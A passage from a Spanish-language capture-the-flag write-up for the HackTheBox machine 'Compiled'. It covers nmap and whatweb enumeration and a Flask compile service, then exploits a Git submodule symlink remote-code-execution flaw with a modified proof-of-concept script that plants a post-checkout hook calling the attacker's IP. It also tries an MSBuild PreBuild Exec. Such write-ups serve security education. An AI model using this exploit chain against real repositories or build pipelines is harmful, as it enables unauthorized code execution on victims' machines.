+</span></span><span style="display:flex;"><span>SF:CSS<span style="color:#ae81ff">\x</span>20here<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*</span>/<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20font-family:<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#39;Ubuntu\x20Mono
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#39;</span>,<span style="color:#ae81ff">\x</span>20monospace;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20backg
+</span></span><span style="display:flex;"><span>SF:round-color:<span style="color:#ae81ff">\x</span>20#272822;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20color:<span style="color:#ae81ff">\x</span>20#ddd;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">}</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\.</span>jumbotron<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20background-color:<span style="color:#ae81ff">\x</span>20#1e1e1e;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20color:<span style="color:#ae81ff">\x</span>20#fff;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20padding:<span style="color:#ae81ff">\x</span>20100px<span style="color:#ae81ff">\x</span>2020px;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20margin-bottom:<span style="color:#ae81ff">\x</span>200;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#f92672">}</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\.</span>services<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#e6db74">&#34;)%r(RTSPReque
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:st,16C,&#34;</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20HTML&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;hea
+</span></span><span style="display:flex;"><span>SF:d&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Error<span style="color:#ae81ff">\x</span>20response&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;
+</span></span><span style="display:flex;"><span>SF:h1&gt;Error<span style="color:#ae81ff">\x</span>20response&lt;/h1&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Error<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:code:<span style="color:#ae81ff">\x</span>20400&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Message:<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0request<span style="color:#ae81ff">\x</span>20version<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;RTSP/1\.0&#39;</span><span style="color:#ae81ff">\)\.</span>&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20&lt;p&gt;Error<span style="color:#ae81ff">\x</span>20code<span style="color:#ae81ff">\x</span>20explanation:<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20request<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20syntax<span style="color:#ae81ff">\x</span>20or<span style="color:#ae81ff">\x</span>20unsupported<span style="color:#ae81ff">\x</span>20method<span style="color:#ae81ff">\.</span>&lt;/p&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/body&gt;<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:n&lt;/html&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 99.56 seconds
+</span></span></span></code></pre></div><h1 id="enumerating-web-services">Enumerating Web Services</h1>
+<p>El puerto 3000 corresponde a una  instancia de Gitea, y nos podemos dar cuenta de que está habilitado el registro.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>También detectamos dos repositorios, una calculadora simple en <code>C++</code> y el código fuente del servicio del puerto 5000
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>El puerto 5000 parece que corresponde a un servicio web</p>
+<p>Vamos a echar un vistazo con <code>whatweb</code> y vemos que el servicio del puerto <code>5000</code> corresponde a un servidor web que por detrás emplea Flask.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.255.250:5000
+</span></span><span style="display:flex;"><span>http://10.129.255.250:5000 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap<span style="color:#f92672">[</span>4.5.2<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Werkzeug/3.0.3 Python/3.12.3<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.255.250<span style="color:#f92672">]</span>, JQuery, Python<span style="color:#f92672">[</span>3.12.3<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Compiled - Code Compiling Services<span style="color:#f92672">]</span>, Werkzeug<span style="color:#f92672">[</span>3.0.3
+</span></span></code></pre></div><p>Esta es la pinta que tiene la página principal.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Tras enumerar el servicio web, no hay nada interesante. Pero me pide una URL de un repositorio de git para, supuestamente, compilar mi código que tiene que ser <code>C++</code>, <code>C#</code> o <code>.NET</code>
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<h1 id="foothold">Foothold</h1>
+<p>Esto me recuerda mucho a la máquina <a href="https://www.hackthebox.com/machines/visual">Visual</a>
+Así que ya me imagino por donde puede ir la explotación, para la máquina Visual necesitabamos hostear el repositorio con Gitea ya que era lo mas fácil, pero aquí ya tenemos hasta el Gitea levantado por el puerto <code>3000</code> y nos podemos hacer una cuenta.</p>
+<p>Volviendo al Gitea, podemos ver el archivo app.py que corresponde con este servicio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, redirect, url_for
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration</span>
+</span></span><span style="display:flex;"><span>REPO_FILE_PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;C:\Users\Richard\source\repos\repos.txt&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    success <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        repo_url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;repo_url&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#75715e"># Add a sanitization to check for valid Git repository URLs.</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(REPO_FILE_PATH, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>write(repo_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>            success <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Your git repository is being cloned for compilation.&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid Git repository URL. It must start with &#34;http://&#34; and end with &#34;.git&#34;.&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, error<span style="color:#f92672">=</span>error, success<span style="color:#f92672">=</span>success)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
+</span></span></code></pre></div><p>Si nos damos cuenta, el funcionamiento es que primero comprueba si es un repositorio válido (que en ese momento parece que no estaba añadida la sanitización de la URL), y acto seguido escribe esta URL en <code>C:\Users\Richard\source\repos\repos.txt</code> y supongo que habrá alguna tarea por detrás o habrá alguna actualización en el código para después compilarlo.</p>
+<p>También podemos saber que cuando ganemos acceso a la máquina probablemente lo ganemos como el usuario <code>Richard</code></p>
+<p>En el repositorio <code>Calculator</code> vemos el siguiente código</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">// Created by Richard Goodman (contact me at richard@compiled.htb)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cmath&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Variables
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	string operation;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">double</span> number1, number2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Enter first number: &#34;</span>;
+</span></span><span style="display:flex;"><span>	cin <span style="color:#f92672">&gt;&gt;</span> number1;
+</span></span><span style="display:flex;"><span>	cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Enter operation (+, -, *, /): &#34;</span>;
+</span></span><span style="display:flex;"><span>	cin <span style="color:#f92672">&gt;&gt;</span> operation;
+</span></span><span style="display:flex;"><span>	cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Enter second number: &#34;</span>;
+</span></span><span style="display:flex;"><span>	cin <span style="color:#f92672">&gt;&gt;</span> number2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// if else statement checking entered operation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;+&#34;</span>) {
+</span></span><span style="display:flex;"><span>		cout <span style="color:#f92672">&lt;&lt;</span> number1 <span style="color:#f92672">+</span> number2;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-&#34;</span>) {
+</span></span><span style="display:flex;"><span>		cout <span style="color:#f92672">&lt;&lt;</span> number1 <span style="color:#f92672">-</span> number2;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;*&#34;</span>) {
+</span></span><span style="display:flex;"><span>		cout <span style="color:#f92672">&lt;&lt;</span> number1 <span style="color:#f92672">*</span> number2;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>) {
+</span></span><span style="display:flex;"><span>		cout <span style="color:#f92672">&lt;&lt;</span> number1 <span style="color:#f92672">/</span> number2;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Not recognized either operation or number:(&#34;</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Esto no nos sirve de nada, pero el proyecto nos sirve para poder añadir la propiedad.</p>
+<p>Nos creamos una cuenta en el Gitea y creamos un repositorio.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Ahora nos clonamos el repositorio original de <code>Calculator</code> y tenemos que modificar el archivo <code>Calculator.vcxproj</code></p>
+<p>Agregué esta linea, hice un commit al repositorio y&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span>  <span style="color:#f92672">&lt;Target</span> <span style="color:#a6e22e">Name=</span><span style="color:#e6db74">&#34;PreBuild&#34;</span> <span style="color:#a6e22e">BeforeTargets=</span><span style="color:#e6db74">&#34;PreBuildEvent&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Exec</span> <span style="color:#a6e22e">Command=</span><span style="color:#e6db74">&#34;ping 10.10.14.71&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/Target&gt;</span>
+</span></span></code></pre></div><p>Nada, así que toca buscar una forma alternativa de conseguir RCE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump icmp -i tun0
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets captured
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets received by filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span></code></pre></div><p>Enumerando un poco mas el repositori de <code>Calculator</code> vemos que en el <code>README.md</code> se encuentra lo siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Richard<span style="color:#75715e">&gt; git --version</span>
+</span></span><span style="display:flex;"><span>git version 2.45.0.windows.1
+</span></span><span style="display:flex;"><span>C:\Users\Richard<span style="color:#75715e">&gt;</span>
+</span></span></code></pre></div><p>Y vemos que hay una vulnerabilidad de tipo RCE.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Esta vulnerabilidad se basa en crear un repositorio malicioso, y si la víctima clona este repositorio con el parámetro <code>--recursive</code> podría ejecutar <code>hooks</code> que estén contemplados en los submódulos del repositorio y conseguir RCE. La vulnerabilidad existe por la forma en la que Git gestiona los enlaces simbólicos en los submódulos de los repositorios.</p>
+<p>Voy a utilizar este <a href="https://amalmurali.me/posts/git-rce/">PoC</a></p>
+<p>Primero nos vamos a crear un repositorio que se llame <code>hook</code>
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Luego otro que se llame <code>incredibol</code> (por ejemplo)
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Ahora, nos podemos descargar este archivo <code>.sh</code> del creador del artículo anteriormente mencionado.
+<a href="https://github.com/amalmurali47/git_rce/blob/main/create_poc.sh">https://github.com/amalmurali47/git_rce/blob/main/create_poc.sh</a></p>
+<p>Modificamos el script para ejecutar un comando en windows y adaptamos el nombre de los repositorios..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>git config --global protocol.file.allow always
+</span></span><span style="display:flex;"><span>git config --global core.symlinks true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hook_repo_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.255.250:3000/pointedsec/hook.git&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git clone <span style="color:#e6db74">&#34;</span>$hook_repo_path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>cd hook
+</span></span><span style="display:flex;"><span>mkdir -p y/hooks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt; y/hooks/post-checkout <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">powershell ping 10.10.14.71
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x y/hooks/post-checkout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git add y/hooks/post-checkout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;post-checkout&#34;</span>
+</span></span><span style="display:flex;"><span>git push
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>incredibol_repo_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.255.250:3000/pointedsec/incredibol.git&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git clone <span style="color:#e6db74">&#34;</span>$incredibol_repo_path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>cd incredibol
+</span></span><span style="display:flex;"><span>git submodule add --name x/y <span style="color:#e6db74">&#34;</span>$hook_repo_path<span style="color:#e6db74">&#34;</span> A/modules/x
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;add-submodule&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;.git&#34;</span> &gt; dotgit.txt
+</span></span><span style="display:flex;"><span>git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;120000 %s 0\ta\n&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat dot-git.hash<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; index.info
+</span></span><span style="display:flex;"><span>git update-index --index-info &lt; index.info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;add-symlink&#34;</span>
+</span></span><span style="display:flex;"><span>git push
+</span></span></code></pre></div><p>Ejecutamos el script, y una vez termine, simplemente le tenemos que pasar el repositorio <code>incredibol</code> para que intente compilarlo en la máquina víctima.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>¡Y tenemos RCE!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump icmp -i tun0
